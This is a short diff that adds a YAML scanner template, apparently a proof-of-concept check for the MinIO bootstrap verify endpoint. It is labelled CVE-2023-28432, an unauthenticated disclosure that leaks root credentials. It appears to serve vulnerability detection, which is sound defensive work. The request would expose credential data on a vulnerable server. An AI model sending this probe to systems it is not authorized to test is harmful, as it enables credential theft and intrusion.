@@ -1,0 +1,14 @@
+name: poc-minio-verify
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: "/minio/bootstrap/v1/verify"
+    expression: response.status == 200 && response.body.bcontains("MinIO")
+expression: r0()
+detail:
+  author: sxel
+  description: MinIO unauthenticated bootstrap info disclosure probe (CVE-2023-28432, leaks root credentials)
+  severity: high
+  tags: minio,info,leak
